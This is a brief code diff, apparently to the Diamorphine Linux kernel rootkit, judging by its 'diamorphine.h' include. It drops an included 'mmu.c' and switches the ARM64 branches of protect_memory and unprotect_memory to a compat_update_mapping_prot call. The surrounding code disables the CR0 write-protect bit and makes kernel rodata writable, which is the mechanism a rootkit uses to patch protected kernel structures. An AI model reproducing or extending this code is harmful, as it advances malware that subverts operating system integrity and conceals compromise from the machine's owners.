@@ -30,7 +30,6 @@
 #endif
 
 #include "diamorphine.h"
-#include "mmu.c"
 
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 unsigned long cr0;
@@ -377,7 +376,7 @@ protect_memory(void)
 	write_cr0(cr0);
 #endif
 #elif IS_ENABLED(CONFIG_ARM64)
-	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
+	compat_update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
 			section_size, PAGE_KERNEL_RO);
 
 #endif
@@ -393,7 +392,7 @@ unprotect_memory(void)
 	write_cr0(cr0 & ~0x00010000);
 #endif
 #elif IS_ENABLED(CONFIG_ARM64)
-	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
+	compat_update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
 			section_size, PAGE_KERNEL);
 #endif
 }
